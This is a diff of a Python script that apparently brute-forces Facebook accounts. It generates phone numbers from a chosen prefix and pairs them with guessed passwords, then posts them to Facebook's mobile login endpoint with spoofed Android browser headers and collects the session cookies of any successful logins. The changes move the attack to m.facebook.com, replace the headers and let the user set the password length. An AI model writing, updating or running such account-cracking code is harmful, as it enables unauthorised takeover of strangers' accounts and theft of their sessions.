@@ -1085,8 +1085,8 @@ def c(e,pw):
     try:
         s=requests.Session()
         #"https://x.facebook.com"
-        rs=s.get(f"https://x.facebook.com/").text
-        subl=re.search('method="post" action="(.*?)"', str(rs)).group(1)
+        rs=s.get("https://free.facebook.com").text
+        
         #print(subl)
         
         
@@ -1105,10 +1105,27 @@ def c(e,pw):
               }
               #Windows,#Android
         
-        hd={'authority': f'x.facebook.com', 'accept': '*/*', 'accept-language': 'en-US,en;q=0.9', 'content-type': 'application/x-www-form-urlencoded', 'origin': f'https://x.facebook.com', 'referer': f'https://x.facebook.com/', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Linux"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': ua, 'x-asbd-id': '198387', 'x-fb-lsd': 'AVqhMT0u6LA', 'x-requested-with': 'XMLHttpRequest', 'x-response-format': 'JSONStream' }
+        hd={"authority": 'm.facebook.com',
+           "method": 'GET',
+           "path": '/m.facebook.com',
+           "scheme": 'https',
+           "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+           "accept-encoding": 'gzip, deflate, br',
+           "accept-language": 'en-US,en;q=0.9',
+           'cache-control': 'max-age=0',
+           "referer": 'https://m.facebook.com/',
+           "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
+           "sec-ch-ua-mobile": '?1',
+           "sec-ch-ua-platform": "Android",
+           "sec-fetch-dest": 'document',
+           "sec-fetch-mode": 'navigate',
+           "sec-fetch-site": 'none',
+           "sec-fetch-user": '?1',
+           "upgrade-insecure-requests": '1',
+           "user-agent": ua}
         
 
-        x=s.post(f"https://x.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data=d,headers=hd).text
+        x=s.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=d,headers=hd).text
                 #print(s.cookies)
         dc=dict(s.cookies)
         coki=";".join([k+"="+v for k,v in dc.items()])
@@ -1149,7 +1166,7 @@ print('Codes:0171,0173,0198,017,019,etc')
 code=input("Enter a Code:")
 #305#random.choice(codes)
 lim=int(input("Limit:"))
-pslen=7#int(input("Password Length (6-11):"))
+pslen=int(input("Password Length (6-11):"))
 adpi=int(input("Additional passwords:"))
 adp=[]
 for i in range(adpi):
